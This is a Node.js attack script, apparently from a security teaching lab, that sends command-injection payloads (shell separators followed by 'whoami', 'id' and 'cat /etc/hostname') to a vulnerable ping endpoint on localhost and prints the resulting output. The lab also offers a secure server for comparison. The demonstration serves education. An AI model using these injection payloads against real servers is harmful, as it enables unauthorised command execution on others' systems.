/*
 * ATTACK 1 — Command chaining / separators
 * -----------------------------------------------------------------------------
 * Technique: append a SECOND command after the expected hostname using a shell
 *   separator. On a Linux/macOS shell (/bin/sh):
 *     ;   run next command unconditionally
 *     &&  run next command if the first succeeded
 *     ||  run next command if the first failed
 *     |   pipe: run next command, feeding it the first's output
 *   On Windows cmd.exe the equivalents are `&`, `&&`, `||` and `|`.
 *
 * Root cause: the server builds `ping -c 1 <host>` and hands the whole string
 *   to a shell. The shell sees our separator and happily runs our command too.
 *
 * Proof of execution: `whoami` / `id` output appears in the response — that is
 *   NOT something `ping` ever prints.
 *
 * Usage:
 *   node attacks/01-command-chaining.js                 # -> vulnerable :3000
 *   TARGET=http://localhost:3001 node attacks/01-...js  # -> secure :3001
 */

const TARGET = process.env.TARGET || process.argv[2] || 'http://localhost:3000';

const payloads = [
  '127.0.0.1; whoami',
  '127.0.0.1 && id',
  '127.0.0.1 | cat /etc/hostname',
  // Windows note: on cmd.exe you would use `127.0.0.1 & whoami` or `& dir`.
];

async function run(payload) {
  console.log('\n────────────────────────────────────────────────────────');
  console.log('PAYLOAD (host field):', JSON.stringify(payload));
  const res = await fetch(`${TARGET}/ping`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ host: payload }),
  });
  const html = await res.text();
  console.log('HTTP status:', res.status);
  console.log('--- server response (output + error blocks) ---');
  console.log(extractBlocks(html));
}

// Pull the <pre>...</pre> blocks out of the rendered page so the proof is easy to read.
function extractBlocks(html) {
  const blocks = [...html.matchAll(/<pre[^>]*>([\s\S]*?)<\/pre>/g)].map(m =>
    m[1].replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').trim()
  );
  return blocks.length ? blocks.join('\n---\n') : '(no <pre> output block in response)';
}

(async () => {
  console.log('== Attack 1: command chaining ==');
  console.log('Target:', TARGET);
  for (const p of payloads) {
    try { await run(p); } catch (e) { console.error('request failed:', e.message); }
  }
})();
